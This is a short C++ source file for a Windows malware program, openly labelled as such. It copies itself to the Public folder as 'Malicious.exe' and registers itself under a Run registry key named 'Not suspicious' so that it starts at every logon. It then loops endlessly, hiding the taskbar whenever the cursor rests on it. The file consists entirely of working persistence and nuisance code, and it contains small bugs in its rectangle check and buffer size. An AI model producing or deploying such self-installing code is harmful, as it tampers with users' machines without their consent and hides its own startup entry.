#include <Windows.h>

// Determines if a point is within a rect
bool contains(RECT rect, POINT point)
{
	return point.x > rect.left && point.x < rect.left + rect.right && point.y > rect.top && point.y < rect.top + rect.bottom;
}

// Main progran execution
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE pInstance, LPSTR lpArg, int nFStil)
{
	wchar_t filePath[MAX_PATH];
	HMODULE GetModHandle = GetModuleHandle(NULL);

	// Gets the path of this program with its filename
	GetModuleFileName(GetModHandle, filePath, sizeof(filePath));

	// Copies this file to the public folder and renames it
	CopyFile(filePath, TEXT("C:\\Users\\Public\\Malicious.exe"), false);

	// Saves a key for the newly copied file in the registry to start automatically
	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, 
		TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, TEXT("Not suspicious"), 0, REG_SZ, 
		(const unsigned char*)TEXT("C:\\Users\\Public\\Malicious.exe"), 
		sizeof(TEXT("C:\\Users\\Public\\Malicious.exe")));
	RegCloseKey(hKey);

	// Payload loop
	while(true)
	{
		Sleep(250);
		
		// Gets the handle for the start bar
		HWND hWin;
		hWin = FindWindow(TEXT("Shell_TrayWnd"), NULL);

		// Gets rect of the start bar
		RECT rWin;
		GetWindowRect(hWin, &rWin);

		// Gets mouse position
		POINT mPos;
		GetCursorPos(&mPos);
		
		if(contains(rWin, mPos))
		{
			// If the mouse is within the start bar rect hide the startbar
			ShowWindow(hWin, false);
		}
		else
		{
			// If the mouse is not within the start bar rect show the startbar
			ShowWindow(hWin, true);
		}
	}

	return 0;
}